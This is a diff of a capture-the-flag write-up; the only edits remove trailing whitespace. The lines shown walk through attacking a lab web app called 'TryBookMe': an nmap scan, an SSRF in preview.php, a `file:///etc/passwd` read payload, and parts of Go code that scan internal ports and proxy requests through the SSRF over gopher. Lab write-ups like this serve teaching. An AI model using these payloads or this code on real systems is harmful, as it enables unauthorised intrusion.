@@ -77,7 +77,7 @@ nmap -sC -sV -p- -T4 10.112.147.90
 ```text
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 2e:2d:c4:cf:f4:d0:4f:cd:c1:82:9e:9e:e1:b7:07:5b (ECDSA)
 |_  256 d7:0f:2d:3c:1b:45:cb:b5:f7:ab:d8:30:15:22:30:dc (ED25519)
 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
@@ -94,7 +94,7 @@ We can see two open ports: SSH (22) and an Apache web server (80). Let's see wha
 
 ### Analyzing the Web Application
 
-Visiting `http://10.112.147.90:80`, we find a web application named "TryBookMe" for viewing documents. 
+Visiting `http://10.112.147.90:80`, we find a web application named "TryBookMe" for viewing documents.
 
 ![TryBookMe Web Service](https://i.imgur.com/JTJiEIq.png)
 
@@ -112,7 +112,7 @@ To test for SSRF, we send the request to Burp Suite Repeater and set up a local 
 
 ![Directory Listing via SSRF](https://i.imgur.com/4Z4hMKr.png)
 
-The application fetches and renders the directory listing from our local machine, confirming the SSRF! 
+The application fetches and renders the directory listing from our local machine, confirming the SSRF!
 
 Next, we test common payloads to read local files, such as `file:///etc/passwd`.
 
@@ -150,7 +150,7 @@ import (
 )
 
 const (
-	targetURL = "http://10.112.147.90:80/preview.php?url=http://127.0.0.1:%d/" //change this to your target url 
+	targetURL = "http://10.112.147.90:80/preview.php?url=http://127.0.0.1:%d/" //change this to your target url
 	workers   = 100
 	maxPort   = 65535
 	timeout   = 5 * time.Second
@@ -201,14 +201,14 @@ func main() {
 Running the script reveals an internal service on port 10000:
 
 ```bash
-go run main.go 
+go run main.go
 [+] Port 80 | Status: 200 | Size: 1735
 [+] Port 10000 | Status: 200 | Size: 6131
 ```
 
 ### SSRF Proxy with Golang
 
-To comfortably interact with the service on port 10000, we can build a proxy that takes our local requests, double-URL encodes them, and routes them through the SSRF vulnerability using the `gopher://` protocol. 
+To comfortably interact with the service on port 10000, we can build a proxy that takes our local requests, double-URL encodes them, and routes them through the SSRF vulnerability using the `gopher://` protocol.
 
 ```go
 package main
@@ -291,7 +291,7 @@ func main() {
 ```
 
 ```bash
-go run main.go 
+go run main.go
 
 [+] Visit 127.0.0.1:1234, proxying to 127.0.0.1:10000 via 10.112.147.90
 ```
